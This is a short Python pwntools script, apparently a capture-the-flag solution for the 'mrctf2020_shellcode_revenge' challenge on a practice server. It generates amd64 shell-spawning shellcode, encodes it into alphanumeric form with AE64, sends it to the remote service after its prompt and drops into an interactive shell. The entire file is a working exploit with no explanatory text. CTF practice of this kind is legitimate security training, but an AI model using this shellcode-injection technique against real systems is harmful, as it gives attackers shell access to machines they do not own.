from pwn import *
from ae64 import *
context.log_level = 'debug'
context.arch = 'amd64'

# io = process(['./mrctf2020_shellcode_revenge'])
io = remote('node4.buuoj.cn', 25890)

sa = lambda x, y: io.sendafter(x, y)
shellcode = AE64().encode(asm(shellcraft.amd64.sh()), 'rax')

if __name__ == '__main__':
    sa(b'Show me your magic!\n', shellcode)
    io.interactive()
